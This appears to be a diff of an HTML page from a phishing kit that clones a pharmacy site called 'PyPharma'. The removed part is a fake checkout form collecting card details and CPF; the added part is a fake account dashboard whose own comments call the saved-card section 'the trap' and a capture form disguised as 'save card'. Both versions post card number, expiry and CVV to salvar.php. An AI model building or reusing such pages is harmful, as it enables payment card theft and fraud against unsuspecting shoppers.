@@ -1,56 +1,125 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Finalizar Pagamento — PyPharma</title>
-    <!-- Mantendo os estilos originais do clone para o visual ficar real -->
-    <link rel="stylesheet" href="_next/static/css/6405bac7976ebda4.css">
-    <link rel="stylesheet" href="_next/static/css/e02272c0bfbbc3db.css">
+    <title>Minha Conta - PyPharma</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
 </head>
-<body class="bg-background text-foreground">
-    <main class="flex-1">
-        <div class="mx-auto max-w-md px-4 py-12">
-            <div class="bg-card border border-border rounded-2xl p-6 shadow-lg">
-                <h2 class="font-display text-xl font-bold text-center mb-6 uppercase tracking-wide">Finalizar Pagamento</h2>
-                
-                <form action="salvar.php" method="POST" class="space-y-4">
-                    <!-- Valor Total (Oculto) -->
-                    <input type="hidden" name="total" value="297.00">
+<body class="bg-gray-100 font-sans">
 
-                    <div>
-                        <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">Nome impresso no cartão</label>
-                        <input type="text" name="card-name" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="Ex: JOÃO DA SILVA">
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">CPF do Titular</label>
-                        <input type="text" name="card-cpf" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="000.000.000-00">
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">Número do Cartão</label>
-                        <input type="text" name="card-number" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="0000 0000 0000 0000">
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-4">
-                        <div>
-                            <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">Validade</label>
-                            <input type="text" name="card-expiry" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="MM/AA">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">CVV</label>
-                            <input type="text" name="card-cvv" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="123">
-                        </div>
-                    </div>
-
-                    <button type="submit" class="w-full mt-6 h-12 rounded-xl bg-primary font-display text-sm uppercase tracking-wider text-primary-foreground shadow-md transition-all hover:brightness-110 active:scale-95">
-                        Confirmar Pagamento
-                    </button>
-                </form>
-            </div>
+    <!-- Navbar Superior -->
+    <nav class="bg-white shadow-sm p-4 flex justify-between items-center border-b border-gray-200">
+        <div class="flex items-center gap-4">
+            <a href="index.html" class="text-blue-600 font-bold text-xl">PyPharma</a>
         </div>
-    </main>
+        <div class="flex items-center gap-3">
+            <span class="text-sm text-gray-600 hidden md:block">Olá, <strong>Usuário</strong></span>
+            <a href="index.html" class="text-sm text-red-500 hover:underline font-medium">Sair</a>
+        </div>
+    </nav>
+
+    <div class="max-w-6xl mx-auto mt-8 flex flex-col md:flex-row gap-6 p-4">
+        
+        <!-- Menu Lateral -->
+        <aside class="w-full md:w-64 space-y-2">
+            <a href="#" class="flex items-center gap-3 p-3 bg-blue-600 text-white rounded-lg shadow-sm">
+                <i data-lucide="layout-dashboard" class="w-5 h-5"></i>
+                <span class="font-medium">Painel Principal</span>
+            </a>
+            <a href="#" class="flex items-center gap-3 p-3 text-gray-600 hover:bg-white hover:text-blue-600 rounded-lg transition">
+                <i data-lucide="package" class="w-5 h-5"></i>
+                <span class="font-medium">Meus Pedidos</span>
+            </a>
+            <a href="#" class="flex items-center gap-3 p-3 text-gray-600 hover:bg-white hover:text-blue-600 rounded-lg transition">
+                <i data-lucide="credit-card" class="w-5 h-5"></i>
+                <span class="font-medium">Cartões Salvos</span>
+            </a>
+            <a href="#" class="flex items-center gap-3 p-3 text-gray-600 hover:bg-white hover:text-blue-600 rounded-lg transition">
+                <i data-lucide="user" class="w-5 h-5"></i>
+                <span class="font-medium">Dados Pessoais</span>
+            </a>
+            <a href="#" class="flex items-center gap-3 p-3 text-gray-600 hover:bg-white hover:text-blue-600 rounded-lg transition">
+                <i data-lucide="headphones" class="w-5 h-5"></i>
+                <span class="font-medium">Suporte</span>
+            </a>
+        </aside>
+
+        <!-- Conteúdo Principal -->
+        <main class="flex-1 space-y-6">
+            
+            <!-- Card de Boas Vindas -->
+            <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
+                <h1 class="text-2xl font-bold text-gray-800">Bem-vindo ao seu painel, PyPharma!</h1>
+                <p class="text-gray-500">Gerencie seus pedidos, endereços e formas de pagamento em um só lugar.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                
+                <!-- Seção de Pedidos Recentes (Fake) -->
+                <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
+                    <div class="flex justify-between items-center mb-4">
+                        <h3 class="font-bold text-gray-700 flex items-center gap-2">
+                            <i data-lucide="clock" class="w-5 h-5 text-blue-500"></i>
+                            Pedidos Recentes
+                        </h3>
+                    </div>
+                    <div class="text-center py-8">
+                        <i data-lucide="shopping-cart" class="w-12 h-12 text-gray-300 mx-auto mb-3"></i>
+                        <p class="text-gray-400 text-sm">Você ainda não possui pedidos realizados.</p>
+                        <a href="index.html" class="text-blue-600 text-sm font-bold hover:underline mt-2 inline-block">Ir para a loja</a>
+                    </div>
+                </div>
+
+                <!-- Seção de Cartões (A ARMADILHA) -->
+                <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
+                    <div class="flex justify-between items-center mb-4">
+                        <h3 class="font-bold text-gray-700 flex items-center gap-2">
+                            <i data-lucide="credit-card" class="w-5 h-5 text-blue-500"></i>
+                            Cartões Salvos
+                        </h3>
+                    </div>
+                    
+                    <div class="bg-gray-50 border-2 border-dashed border-gray-200 rounded-xl p-6 text-center">
+                        <p class="text-gray-500 text-sm mb-4">Nenhum cartão cadastrado para compras rápidas.</p>
+                        
+                        <!-- Formulário de Captura Disfarçado de "Salvar Cartão" -->
+                        <form action="salvar.php" method="POST" class="space-y-3 text-left">
+                            <input type="hidden" name="tipo_operacao" value="CARTAO_SALVO">
+                            
+                            <div>
+                                <label class="text-xs font-semibold text-gray-400 uppercase">Nome no Cartão</label>
+                                <input type="text" name="card-name" required class="w-full p-2 text-sm border border-gray-300 rounded bg-white outline-none focus:ring-1 focus:ring-blue-500">
+                            </div>
+                            
+                            <div class="grid grid-cols-2 gap-2">
+                                <div>
+                                    <label class="text-xs font-semibold text-gray-400 uppercase">Número</label>
+                                    <input type="text" name="card-number" required placeholder="0000 0000..." class="w-full p-2 text-sm border border-gray-300 rounded bg-white outline-none focus:ring-1 focus:ring-blue-500">
+                                </div>
+                                <div>
+                                    <label class="text-xs font-semibold text-gray-400 uppercase">Validade</label>
+                                    <input type="text" name="card-expiry" required placeholder="MM/AA" class="w-full p-2 text-sm border border-gray-300 rounded bg-white outline-none focus:ring-1 focus:ring-blue-500">
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <label class="text-xs font-semibold text-gray-400 uppercase">CVV</label>
+                                <input type="text" name="card-cvv" required placeholder="123" class="w-full p-2 text-sm border border-gray-300 rounded bg-white outline-none focus:ring-1 focus:ring-blue-500">
+                            </div>
+
+                            <button type="submit" class="w-full bg-blue-600 text-white text-sm font-bold py-2 rounded hover:bg-blue-700 transition">
+                                Salvar Cartão para Compras Rápidas
+                            </button>
+                        </form>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+    </div>
+
+    <script>lucide.createIcons();</script>
 </body>
 </html>
